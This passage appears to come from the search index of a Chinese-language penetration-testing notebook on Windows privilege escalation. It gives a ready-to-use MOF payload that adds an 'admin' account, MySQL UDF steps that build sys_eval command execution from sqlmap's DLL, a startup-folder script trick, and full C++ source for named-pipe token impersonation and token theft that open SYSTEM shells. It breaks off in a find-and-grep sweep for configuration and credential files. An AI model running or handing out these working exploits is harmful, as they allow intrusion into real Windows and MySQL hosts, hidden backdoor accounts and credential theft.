.\u4f46\u662fnbns\u6d41\u91cf\u5305\u8fd8\u6709\u4e2a\u53eb\u7279\u5f81\u7801\u7684\u4e1c\u897f\uff0c\u8bf7\u6c42\u5305\u548c\u54cd\u5e94\u5305\u7684\u7279\u5f81\u7801\u5fc5\u987b\u76f8\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u88ab\u8feb\u53d1\u900165536\u4e2a\u5305\u7206\u7834\u8fd9\u4e2a\u7279\u5f81\u7801\u2014\u2014\u672c\u5730\u53d1\u5305\u901f\u5ea6\u5f88\u5feb\uff0c\u672c\u5730NBNS\u6b3a\u9a97\u6210\u529f\u7387\u57fa\u672c\u4e0a\u5728100%\u3002 2.WPAD\u52ab\u6301 NBNS\u6b3a\u9a97\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u52ab\u6301WPAD\u7684\u57df\u540d\uff0c\u628a\u81ea\u5df1\u4f2a\u9020\u79f0WPAD\u5e76\u8fd4\u56de\u81ea\u5b9a\u4e49\u7684PAC\u6587\u4ef6\u3002\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u628a\u672c\u5730\u53d1\u51fa\u7684\u6240\u6709\u6d41\u91cf\u91cd\u5b9a\u5411\u3002 3.RELAY \u5728\u73b0\u5728\u8fd9\u4e2a\u5e74\u4ee3\uff0cSMB->SMB\u7684relay\u5f88\u5c11\u7528\u5230\u4e86\uff0c\u5fae\u8f6f \u7981\u7528\u4e86\u540c\u534f\u8bae\u7684NTLM\u8ba4\u8bc1 \uff0c\u6210\u529f\u7387\u5f88\u4f4e\u3002 \u4f46\u662fHTTP->SMB\u7684relay\u8fd8\u662f\u6709\u7684\u3002HOT POTATO\u5c31\u662f\u5229\u7528\u7684\u8fd9\u4e00\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u628a\u4e3b\u673a\u53d1\u51fa\u7684HTTP\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u7f51\u9875A\uff0c\u800c\u7f51\u9875A\u9700\u8981NTLM\u8ba4\u8bc1\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884cHTTP->SMB\u7684relay\u2019\u4e86\u3002\u5f53HTTP\u8bf7\u6c42\u6765\u81ea\u4e8e\u9ad8\u6743\u9650\u7684\u8d26\u6237\u65f6\uff0c\u4f8b\u5982\u662f\u6765\u81eawindows \u66f4\u65b0\u670d\u52a1\u7684\u8bf7\u6c42\uff0c\u547d\u4ee4\u5c31\u4f1a\u4ee5\u201dNT AUTHORITY\\SYSTEM\u201d\u6743\u9650\u8fd0\u884c\u3002 HOT POTATO \u6839\u636eWindows\u7248\u672c\u7684\u4e0d\u540c\uff0c\u9700\u8981\u7b49\u5f85\u9ad8\u6743\u9650\u7528\u6237NTLM\u8ba4\u8bc1\u6765\u5230\u7684\u65f6\u95f4\u4e5f\u4e0d\u540c\u3002\u4e00\u822c\u6765\u8bf4\uff0c WIN7\u662f\u77ac\u95f4\u5c31\u53ef\u4ee5\u63d0\u6743\u7684 Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8\u6709\u4e00\u4e2a\u81ea\u52a8\u66f4\u65b0\u673a\u5236\uff0c\u4f1a\u6bcf\u5929\u4e0b\u8f7d\u8bc1\u4e66\u4fe1\u4efb\u5217\u8868(CTLs) ,etc","title":"hot potato"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#mysql","text":"","title":"MYSQL\u4e0b\u7684\u63d0\u6743\u6280\u672f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#mof","text":"\u5728c:/windows/system32/wbem/mof/\u76ee\u5f55\u4e0b\u7684nullevt.mof\u6bcf\u5206\u949f\u90fd\u4f1a\u6709\u4e00\u4e2a\u7279\u5b9a\u7684\u65f6\u95f4\u53bb\u6267\u884c\u4e00\u6b21\uff08\u7531\u201dAnd TargetInstance.Second = 5\u2033;\u63a7\u5236\uff0c\u8fd9\u91cc\u8f93\u51655\u5c31\u662f\u6bcf\u5206\u949f\u7684\u7b2c\u4e94\u79d2\u6267\u884c\u3002 \u90a3\u4e48\u628acmd\u547d\u4ee4\u6dfb\u52a0\u5230nullevt.mof\u4e2d\uff0ccmd\u547d\u4ee4\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u4e86\u3002 \u524d\u63d0\u662f\u6211\u4eec\u8981\u80fd\u8fdb\u5165\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e14mysql\u6570\u636e\u5e93\u7684\u6743\u9650\u5c3d\u53ef\u80fd\u9ad8\u624d\u66f4\u6709\u5229\u3002\u540c\u65f6secure-file-priv \u8981\u4e3a\u7a7a\uff08 mysql 5.6.34\u7248\u672c\u4ee5\u540e secure_file_priv\u7684\u503c\u9ed8\u8ba4\u4e3aNULL,\u7981\u6b62\u6240\u6709\u6587\u4ef6\u5bfc\u5165\u5bfc\u51fa\u529f\u80fd\uff09 \u6211\u4eec\u4f2a\u9020\u7684MOF\u6587\u4ef6\u683c\u5f0f\u5982\u4e0b #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admin admin /add\\\")\"; //\u4fee\u6539\u6b64\u5904\u5373\u53ef }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; \u4fee\u6539\u4e0a\u9762\u7684cmd\u90e8\u5206\u5373\u53ef\u5b9e\u73b0\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u6267\u884c\u5404\u79cd\u547d\u4ee4\u3002 \u7136\u540e\u6211\u4eec\u4f7f\u7528mysql\u4e0b\u7684\u547d\u4ee4 \uff0c\u5c06mof\u8986\u76d6\u8fc7\u53bb\u3002 \u5f85\u6211\u4eec\u7684\u547d\u4ee4\u88ab\u6267\u884c\u540e\uff0c\u5373\u4ee3\u8868\u63d0\u6743\u6210\u529f\u3002 Windows 2003\u4f3c\u4e4e\u6210\u529f\u7387\u86ee\u9ad8\u7684\uff0cWIN7\u8bd5\u4e86\u8bd5\u6ca1\u53cd\u5e94\u3002\u3002\u3002","title":"MOF\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#udf","text":"\uff08\u8fd9\u4e2a\u4e5f\u53ef\u4ee5linux\u63d0\u6743 udf\uff0c\u5373\u81ea\u5b9a\u4e49\u51fd\u6570\uff08user define function\uff09 MYSQL\u53ef\u4ee5\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u3002\u81ea\u5b9a\u4e49\u51fd\u6570\u5728Windows\u4e0b\u662f\u4ee5DLL\u6587\u4ef6\u5b58\u5728\u4e8eMYSQL\u7684\u63d2\u4ef6\u6587\u4ef6\u5939\u91cc\u9762\u7684\uff08linux\u5219\u662f\u4ee5os\u7684\u5f62\u5f0f\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u6076\u610fdll\uff0c\u91cc\u9762\u5b58\u653e\u7740\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684 \u51fd\u6570\u3002\u7136\u540e\u4ea4\u7ed9mysql\u4ee5\u6570\u636e\u5e93\u6743\u9650\u6267\u884c\u3002 \u524d\u63d0\uff1a\u6211\u4eec\u80fd\u64cd\u4f5c\u6570\u636e\u5e93\uff0c\u4e14\u6570\u636e\u5e93\u6743\u9650\u5fc5\u987b\u5f88\u9ad8\uff08\u6211\u4eec\u7528\u8fd9\u4e2a\u65b9\u6cd5\u63d0\u6743\u5230\u7684\u6743\u9650\u5c31\u662f\u6570\u636e\u5e93\u7684\u6743\u9650 \u90a3\u4e48\u8fd9\u4e2adll\u6587\u4ef6\u54ea\u91cc\u6765\u5462\u3002sqlmap\u548cmsf\u90fd\u6709\u3002sqlmap\u4e0b\u7684 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ \u5c31\u662f\u8fd9\u4e2adll\u6587\u4ef6\u7684\u7f16\u7801\u7248\u672c\u3002\u6211\u4eec\u4f7f\u7528sqlmap\u4e0b\u7684sqlmap/extra/cloak/cloak.py\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u83b7\u5f97dll\u6587\u4ef6\u3002 python ./cloak.py -d -i ./lib_mysqludf_sys.dll_ \u5373\u53ef\u83b7\u5f97dll\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u628adll\u6587\u4ef6\u653e\u5165mysql\u7684\u63d2\u4ef6\u6587\u4ef6\u5939\uff0c\u547d\u540d\u4e3audf.dll\u3002\u63d2\u4ef6\u6587\u4ef6\u5939\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4 show variables like \"%plugin%\";\u83b7\u5f97 \uff08/lib/plugin\u6587\u4ef6\u5939\u9700\u8981\u81ea\u5df1\u521b\u5efa\uff09 \u81f3\u4e8e\u600e\u4e48\u628adll\u653e\u5165\u63d2\u4ef6\u6587\u4ef6\u5939 1.\u76f4\u63a5\u7c98\u8d34\u590d\u5236 \uff08\u6743\u9650\u53ef\u80fd\u4e0d\u591f 2.\u4f7f\u7528\u547d\u4ee4 select load_file(\u2018udf.dll\u2019) into dumpfile \u201cPLUGIN\u7684\u8def\u5f84\u201d;(\u9700\u8981secure_file_priv\u4e3a\u7a7a \u603b\u4e4b\uff0c\u5982\u679c\u628audf.dll\u653e\u5165plugin\u6587\u4ef6\u5939\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u63d0\u6743\u4e86\u3002 create funtion sys_eval returns string soname \"udf.dll\"; select sys_eval('cmd');","title":"UDF\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_8","text":"\u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u901a\u8fc7mysql\u7684\u9ad8\u6743\u9650\uff0c\u5411windows\u5f00\u673a\u542f\u52a8\u9879\u6587\u4ef6\u5939\u91cc\u653e\u5165\u6076\u610fvbs\u6216\u8005bat\u811a\u672c,\u673a\u5668\u91cd\u542f\u540e\u81ea\u52a8\u6267\u884c\u3002\u600e\u4e48\u8ba9\u673a\u5668\u91cd\u542f\uff1f\u7b49\u7ba1\u7406\u5458\u6216\u8005 \u4e00\u4e9b\u53ef\u5bfc\u81f4\u670d\u52a1\u5668\u84dd\u5c4f\u7684EXP \u542f\u52a8\u9879\u8def\u5f84\u4e00\u822c\u4e3a\uff1a C:\\Documents and Settings\\All Users\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8 C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup select load_file(\"xxx\") into dumpfile \"xxxx\"; \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684","title":"\u542f\u52a8\u9879\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_9","text":"\u63d0\u6743\u65b9\u5f0f\u4e3a \u4ee4\u724c\u6a21\u4eff\u3002 Token Impersonation . meterpreter\u7684getsystem\u7684\u63d0\u53d6\u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f\u8fd9\u4e2a\u65b9\u6cd5 \u63d0\u6743\u8fc7\u7a0b\u4e3a\u4eceadministrator\u7528\u6237\u63d0\u5230SYSTEM\u6743\u9650\u3002\u4ece\u666e\u901a\u7528\u6237\u63d0\u6743\u5230admin\u53ca\u4ee5\u4e0a\u6743\u9650\u662f\u4e0d\u53ef\u53d6\u7684\uff0c\u56e0\u4e3a\u666e\u901a\u7528\u6237\u521b\u5efa\u7684\u547d\u540d\u7ba1\u9053\u6ca1\u6709 SeImpersonatePrivilege \uff0c\u5728\u590d\u5236\u4ee4\u724c\u65f6\u4f1a\u51fa\u73b01346\u9519\u8bef\u3002 \u8be5\u65b9\u6cd5\u6280\u672f\u7ec6\u8282\u4e3a\uff1a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u521b\u5efa\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\uff0c\u518d\u901a\u8fc7\u521b\u5efaSYSTEM\u6743\u9650\u670d\u52a1\uff0c\u8ba9\u670d\u52a1\u8fde\u4e0a\u547d\u540d\u7ba1\u9053\uff0c\u968f\u540e\u6211\u4eec\u901a\u8fc7\u6a21\u62df\u5ba2\u6237\u7aef\uff0c\u83b7\u5f97SYSTEM\u6743\u9650\u7684\u4ee4\u724c\uff0c\u968f\u540e\u5c06\u5176\u590d\u5236\uff0c\u518d\u7528\u590d\u5236\u540e\u7684\u4ee4\u724c\u521b\u5efa\u65b0\u8fdb\u7a0b\uff08\u5982CMD)\uff0c\u65b0\u8fdb\u7a0b\u7684\u6743\u9650\u5373SYSTEM\u6743\u9650\u3002 \u8fd9\u91cc\u8d34\u4e0a\u5b9e\u73b0\u4ee3\u7801. \u9996\u5148\u662f\u88ab\u521b\u5efa\u7684\u670d\u52a1\u7684\u5b9e\u73b0\u4ee3\u7801\uff0c\u8be5\u670d\u52a1\u542f\u52a8\u540e\u4f1a\u4e0d\u65ad\u5411\u670d\u52a1\u5668\u547d\u540d\u7ba1\u9053\u5efa\u7acb\u94fe\u63a5 \u751f\u6210\u597d\u540e\uff0c\u662fService.exe #include<Windows.h> #include<iostream> SERVICE_STATUS m_ServiceStatus; SERVICE_STATUS_HANDLE m_ServiceStatusHandle; BOOL bRunning; void WINAPI ServiceMain(DWORD argc, LPTSTR* argv); void WINAPI HandlerFunc(DWORD code); int main() { WCHAR Servicename[] = L\"ServiceA\"; SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) { m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwServiceSpecificExitCode = 0; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; m_ServiceStatusHandle = RegisterServiceCtrlHandler(L\"ServiceA\", HandlerFunc); m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = true; while (bRunning) { LPCWSTR PipeName = L\"\\\\\\\\.\\\\pipe\\\\testpipe\"; HANDLE PipeHandle=NULL; BOOL PipeInstance; WCHAR message[512] = { 0 }; DWORD bytesWritten = 0; BOOL Flag = true; wchar_t message2[] = L\"HELL\"; DWORD messageLength = lstrlen(message2) * 2; do { PipeHandle = CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); } while (PipeHandle == INVALID_HANDLE_VALUE); WriteFile(PipeHandle, &message2, messageLength, &bytesWritten, NULL); Flag = ReadFile(PipeHandle, &message, 512, &bytesWritten, NULL); std::cout << \"Message:\" << message << std::endl; } } void WINAPI HandlerFunc(DWORD code) { switch (code) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } } \u7136\u540e\u662f\u4e3b\u4f53\uff0c\u547d\u540d\u7ba1\u9053\u670d\u52a1\u5668\u3002\u751f\u6210\u540e\u662fServer.exe #include<Windows.h> #include<iostream> int main() { LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\testpipe\"; LPVOID pipeBuffer = NULL; HANDLE serverPipe; DWORD readBytes = 0; DWORD readBuffer = 0; int err = 0; BOOL isPipeConnected; BOOL isPipeOpen; wchar_t message[] = L\"HELL\"; DWORD messageLenght = lstrlen(message) * 2; DWORD bytesWritten = 0; WCHAR message2[512] = { 0 }; //Open a Named Pipe,Wait for a connection std::wcout << \"Creating named pipe \" << pipeName << std::endl; serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL); //Create a service of system to connect to our NamedPipe. char servicename[] = \"Service.exe\"; char servicepath[_MAX_PATH]; SERVICE_STATUS status; GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath)); SC_HANDLE scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if (GetLastError() == 0) { } else { std::cout << \"ERROR OpenSCManager:\" << GetLastError() << std::endl; } SC_HANDLE scService = CreateServiceA(scManager, servicename, servicename, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, servicepath, NULL, NULL, NULL, NULL, NULL); if (!scService) { if (GetLastError() == 1073) { std::cout << \"The Service has been exsisted\" << std::endl; } else { std::cout << \"ERROR CreateServiceA:\" << GetLastError() << std::endl; } } SC_HANDLE scServiceA = OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS); if (StartService(scServiceA, 0, NULL)) { std::cout<<\"service Start success\"<<std::endl; } else { if (GetLastError() == 1056) { std::cout << \"service is running,don't need to start again\" << std::endl; } } //Connect ! isPipeConnected = ConnectNamedPipe(serverPipe, NULL); if (isPipeConnected) { std::wcout << \"Incoming connection to \" << pipeName << std::endl; ReadFile(serverPipe, &message2, 512, &bytesWritten, NULL); std::cout << message2; } else { std::cout << \"Does not connected Error: \"<<GetLastError() << std::endl; } std::wcout << \"Sending message: \" << message << std::endl; WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL); //Toekn Impersonation std::wcout << \"Impersonating the client...\" << std::endl; if (!ImpersonateNamedPipeClient(serverPipe)) { std::cout<<\"ImpersonateNamedPipeClient ERROR: \"<<GetLastError()<<std::endl; } else { std::cout << \"ImpersonateNamedPipeClient success\" << std::endl; } STARTUPINFOA si; PROCESS_INFORMATION pi = {}; ZeroMemory(&pi, sizeof(pi)); ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); HANDLE token; if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) { std::cout << \"GetCurrentThread ERROR:\" << GetLastError() << std::endl; } CHAR command1[] = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"; WCHAR command2[] = L\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"; HANDLE Token; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&Token)) { std::cout << \"DuplicateTokenEx ERROR:\" << GetLastError() << std::endl; } else { std::cout << \"Impersonate completed\" << std::endl; } if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) { std::cout << \"CreateProcessAsUserA ERROR:\" << GetLastError() <<\" Now Use CreateProcessWithTokenW\"<< std::endl; if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) { std::cout << \"CreateProcessWithTokenW ERROR:\" << GetLastError() << std::endl; } else { std::cout << \"CreateProcessWithTokenW success\" << std::endl; } } else { std::cout << \"CreateProcessWithTokenW success\" << std::endl; } while(1){} } \u6211\u4eec\u751f\u6210\u4e86Service.exe,\u7136\u540e\u628a\u4ed6\u79fb\u5230Server.exe\u540c\u7ea7\u76ee\u5f55\uff0c\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884cServer.exe,\u5373\u53ef\u8fbe\u5230admin-\u300bsystem\u7684\u63d0\u6743\u3002 \u7a0b\u5e8f\u5199\u4e86\u56db\u5929\u7ec8\u4e8e\u5199\u597d\u4e86\u3002\u3002WIN7\u4e0b\u53ef\u4ee5\u5b9e\u73b0\u5b8c\u7f8e\u63d0\u6743\u3002 \u9879\u76ee\u5730\u5740: https://github.com/ConsT27/EvilNamedPipe/tree/1.0","title":"\u547d\u540d\u7ba1\u9053\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_10","text":"SYSTEM->\u672c\u673a\u4e0a\u5176\u4ed6\u7528\u6237\uff08\u5305\u62ec\u57df\u7528\u6237\uff09(\u597d\u5bb6\u4f19\uff0c\u53ea\u8981\u672c\u673a\u6709system\u6743\u9650\uff0c\u57df\u7ba1\u6562\u5728\u672c\u673a\u4e0a\u521b\u5efa\u8fdb\u7a0b\u5c31\u76f4\u63a5\u80fd\u62ff\u5230\u57df\u7ba1\u6743\u9650\uff09 \u6216\u8005admin\u83b7\u53d6debug\u6743\u9650\u540e\u53bb\u83b7\u53d6SYSTEM\u6743\u9650\uff08\u8fd9\u91cc\u6709\u4e00\u4e2a\u7ec6\u8282\u70b9\uff0c\u53ea\u6709owner\u4e3aadministrator\u7684SYSTEM\u8fdb\u7a0b\u624d\u80fd\u88ab\u5229\u7528\uff0c\u6bd4\u5982lsass\uff0cdllhost) \u6280\u672f\u7ec6\u8282:\u901a\u8fc7\u5bfb\u627e\u9ad8\u6743\u9650\u5f00\u542f\u7684\u8fdb\u7a0b\uff0c\u518d\u590d\u5236\u5176\u4ee4\u724c\u7528\u4ee5\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u5373\u53ef\u8fbe\u5230\u63d0\u6743\u76ee\u7684 #include <iostream> #include <Windows.h> //Only administrator can get debug priv BOOL GetDebugPriv() { HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token)) { std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; return false; } tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid)) { std::cout << \"LookupPrivilegeValue ERROR\" << GetLastError() << std::endl; return false; } tp.Privileges[0].Luid = Luid; if (!AdjustTokenPrivileges(Token, FALSE, &tp, sizeof(tp), NULL, NULL) ){ std::cout << \"AdjustTokenPrivileges ERROR\" << GetLastError() << std::endl; return false; } if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { return false; } else { return true; } } int main(int argc, char* argv[]) { HANDLE t_process; HANDLE token = NULL; HANDLE token_bak = NULL; DWORD process_id; sscanf_s(argv[1], \"%ul\", &process_id); WCHAR command[] = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; STARTUPINFO startupInfo; PROCESS_INFORMATION processInformation; ZeroMemory(&startupInfo, sizeof(STARTUPINFO)); ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION)); startupInfo.cb = sizeof(STARTUPINFO); std::cout << argv[1] << std::endl; std::cout << \"Openning process PID:\" << process_id << std::endl; if (GetDebugPriv()== TRUE) { std::cout << \"Got the debug priv\" << std::endl; } else { std::cout << \"GetDebugPriv ERROR\" << std::endl; } system(\"whoami /priv\"); t_process = OpenProcess(PROCESS_ALL_ACCESS, true, process_id); if (!t_process) { std::cout << \"OpenProcess ERROR\" << GetLastError() << std::endl; } if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &token)) { std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; } if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &token_bak)) { std::cout << \"DuplicateTokenEx ERROR\" << GetLastError() << std::endl; } if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &startupInfo, &processInformation)) { std::cout << \"CreateProcessWithTokenW ERROR\" << GetLastError() << std::endl; } return 0; } \u8fd9\u662f\u5728win7\u4e0b\u7684\u6d4b\u8bd5\u7ed3\u679c const\\administrator \u662f\u57df\u63a7","title":"\u4ee4\u724c\u7a83\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/","text":"\u65b0\u9875\u9762","title":"\u65b0\u9875\u9762"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/#_1","text":"","title":"\u65b0\u9875\u9762"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/","text":"\u6570\u636e\u641c\u96c6 \u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5bc6\u7801\u6293\u53d6 \u672c\u673a\u654f\u611f\u4fe1\u606f\u6536\u96c6","title":"\u6570\u636e\u641c\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/#_1","text":"\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5bc6\u7801\u6293\u53d6 \u672c\u673a\u654f\u611f\u4fe1\u606f\u6536\u96c6","title":"\u6570\u636e\u641c\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E6%90%9C%E9%9B%86/%E6%9C%AC%E6%9C%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%9C%AC%E6%9C%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","text":"\u672c\u673a\u654f\u611f\u4fe1\u606f\u6536\u96c6 find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E 